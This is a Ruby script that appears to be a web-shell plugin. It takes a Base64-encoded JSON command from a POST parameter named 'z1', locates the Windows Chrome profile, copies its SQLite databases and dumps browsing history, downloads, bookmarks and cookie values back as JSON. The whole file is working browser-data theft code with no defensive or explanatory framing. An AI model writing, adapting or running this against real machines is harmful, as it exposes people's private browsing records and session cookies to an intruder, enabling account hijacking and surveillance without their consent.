require 'base64'
require 'json'
require 'sqlite3'
require 'fileutils'

$chrome_base = ''
$profile_dir = 'Default'
$chrome_dir = ''

def dump_history
  history_file = File.join($chrome_dir, 'History')
  return [] unless File.exist?(history_file)

  dst = File.join(Dir.tmpdir, "sqlite_#{rand(100000..999999)}.tmp")
  begin
    FileUtils.cp(history_file, dst)
  rescue
    return []
  end

  results = []
  begin
    db = SQLite3::Database.new(dst)
    db.results_as_hash = true
    db.execute("SELECT url, title, last_visit_time FROM urls") do |row|
      results << {
        'URL' => row['url'],
        'Title' => row['title'] || '',
        'LastUsed' => row['last_visit_time']
      }
    end
    db.close
  rescue => e
    # do something
  end

  File.delete(dst) if File.exist?(dst)
  results
end

def dump_cookie
  cookie_file = File.join($chrome_dir, 'Network', 'Cookies')
  unless File.exist?(cookie_file)
    cookie_file = File.join($chrome_dir, 'Cookies')
  end

  return [] unless File.exist?(cookie_file)

  dst = File.join(Dir.tmpdir, "sqlite_#{rand(100000..999999)}.tmp")
  begin
    FileUtils.cp(cookie_file, dst)
  rescue
    return []
  end

  results = []
  begin
    db = SQLite3::Database.new(dst)
    db.results_as_hash = true
    db.execute("SELECT host_key, name, value FROM cookies") do |row|
      results << {
        'Host' => row['host_key'],
        'Name' => row['name'],
        'Value' => row['value']
      }
    end
    db.close
  rescue => e
    # do something
  end

  File.delete(dst) if File.exist?(dst)
  results
end

def dump_download
  history_file = File.join($chrome_dir, 'History')
  return [] unless File.exist?(history_file)

  dst = File.join(Dir.tmpdir, "sqlite_#{rand(100000..999999)}.tmp")
  begin
    FileUtils.cp(history_file, dst)
  rescue
    return []
  end

  results = []
  begin
    db = SQLite3::Database.new(dst)
    db.results_as_hash = true
    db.execute("SELECT target_path, tab_url, total_bytes, start_time FROM downloads") do |row|
      results << {
        'FileName' => row['target_path'] || '',
        'TargetPath' => row['target_path'] || '',
        'URL' => row['tab_url'] || '',
        'Length' => (row['total_bytes'] || 0).to_i,
        'Date' => row['start_time'] || ''
      }
    end
    db.close
  rescue => e
    # do something
  end

  File.delete(dst) if File.exist?(dst)
  results
end

def parse_bookmarks_node(node, results)
  if node.is_a?(Hash)
    if node['type'] == 'url'
      results << {
        'name' => node['name'] || '',
        'url' => node['url'] || ''
      }
    end
    
    if node['children'].is_a?(Array)
      node['children'].each do |child|
        parse_bookmarks_node(child, results)
      end
    end
  end
end

def dump_bookmark
  bookmark_file = File.join($chrome_dir, 'Bookmarks')
  return [] unless File.exist?(bookmark_file)

  results = []
  begin
    content = File.read(bookmark_file, encoding: 'UTF-8')
    json = JSON.parse(content)
    
    if json['roots'].is_a?(Hash)
      json['roots'].each_value do |root_node|
        parse_bookmarks_node(root_node, results)
      end
    end
  rescue => e
    # do something
  end

  results
end

def do_init
  appdata = ENV['LOCALAPPDATA']
  if appdata.nil? || appdata.empty?
    appdata = ENV['USERPROFILE'] ? "#{ENV['USERPROFILE']}\\AppData\\Local" : ''
  end

  return false if appdata.empty?

  $chrome_base = "#{appdata}\\Google\\Chrome\\User Data"
  File.directory?($chrome_base)
end

def main
  z1 = $_POST['z1']
  return '[-] Invalid JSON / Base64.' unless z1

  begin
    config = JSON.parse(Base64.decode64(z1))
  rescue
    return '[-] Invalid JSON / Base64.'
  end

  return '[-] Initialization failed: ' + $chrome_base unless do_init

  action = config['action'] || ''
  profile = config['profile'] || 'Default'

  $profile_dir = profile
  $chrome_dir = File.join($chrome_base, profile)

  response = {
    'status' => 'success',
    'action' => action,
    'data' => []
  }

  case action
  when 'history'
    response['data'] = dump_history
  when 'cookie'
    response['data'] = dump_cookie
  when 'download'
    response['data'] = dump_download
  when 'bookmark'
    response['data'] = dump_bookmark
  else
    return "[-] Unknown action: #{action}"
  end

  JSON.generate(response)
end

print main